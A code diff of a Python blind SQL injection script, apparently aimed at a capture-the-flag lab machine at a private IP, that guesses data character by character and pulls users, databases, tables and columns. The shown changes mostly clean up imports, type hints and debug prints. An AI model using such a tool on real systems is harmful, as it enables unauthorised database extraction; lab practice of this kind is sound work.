@@ -1,10 +1,5 @@
 #!/usr/bin/python3
 
-from dataclasses import dataclass
-from abc import ABC, abstractmethod
-from types import MethodType
-from pwn import *
-from typing import Tuple, Optional
 import requests
 import signal
 import sys
@@ -13,7 +8,9 @@ import os
 import re
 import math
 import concurrent.futures
-import copy
+from dataclasses import dataclass
+from abc import ABC, abstractmethod
+from pwn import *
 
 
 # Ctrl + c
@@ -140,7 +137,7 @@ class RequestType(ABC):
     @abstractmethod
     def build_request(
         self,
-        data: str | dict,
+        data,
         atribute_to_exploit: str,
         payload: Payload,
         main_url: str,
@@ -166,7 +163,7 @@ class PostRequest(RequestType):
 
     def build_request(
         self,
-        data: str | dict,
+        data: dict,
         atribute_to_exploit: str,
         payload: Payload,
         main_url: str,
@@ -208,7 +205,7 @@ class GetRequest(RequestType):
 
     def build_request(
         self,
-        data: str | dict,
+        data: str,
         atribute_to_exploit: str,
         payload: Payload,
         main_url: str,
@@ -241,16 +238,9 @@ class GetRequest(RequestType):
 
         if self.stop_threads:
             return None
-        print(requests_data.headers)
-        print(requests_data.data)
+
         response = requests.get(str(requests_data.data), requests_data.headers)
 
-        print(response.text)
-
-        if "Welcome to the IMF Administration" in response.text:
-            print(
-                f"Character: {chr(requests_data.character)} Findddddddddddddddddddddddddddd"
-            )
         return WrapperResponse(response, requests_data.character)
 
 
@@ -269,10 +259,8 @@ class TextInCondition(Condition):
     def get_condition(self, response: requests.Response) -> bool:
         result = False
 
-        print(f"{self._value} NOT FOUND")
         if self._value in response.text:
             result = True
-            print(f"{self._value} FOUND")
 
         return result
 
@@ -712,10 +700,7 @@ def main():
     print("\n")
     time.sleep(1)
 
-    response = requests.get("http://192.168.1.103")
-    print(str(response.text))
-
-    # instance.get_user(label_menu)
+    instance.get_user(label_menu)
     # instance.get_dbs(label_menu)
     # instance.get_tables(label_menu)
     # instance.get_columns(label_menu)
@@ -723,5 +708,10 @@ def main():
     # instance.build_file()
 
 
+def test():
+    response = requests.get("http://192.168.1.103")
+    print(response.text)
+
+
 if __name__ == "__main__":
-    main()
+    test()
